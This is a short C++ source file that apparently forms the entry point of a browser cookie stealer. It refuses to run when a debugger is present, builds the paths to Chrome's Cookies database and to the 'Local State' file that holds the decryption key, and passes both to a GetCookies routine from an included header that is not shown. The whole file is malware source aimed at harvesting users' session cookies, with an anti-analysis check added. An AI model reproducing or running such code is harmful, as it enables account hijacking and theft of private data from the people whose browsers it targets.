#include <iostream>
#include "tools/cookies.h"



int main()
{
    if(IsDebuggerPresent()) {
        std::cerr << "Debugger detected!" << std::endl;
        return 1;
    }
    std::string cookie_path = getenv("USERPROFILE");
    cookie_path.append(R"(\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies)");
    std::string state_file = getenv("USERPROFILE");
    state_file.append(R"(\AppData\Local\Google\Chrome\User Data\Local State)");
    cookies c;
    c.GetCookies(cookie_path, state_file);
    return 0;
}
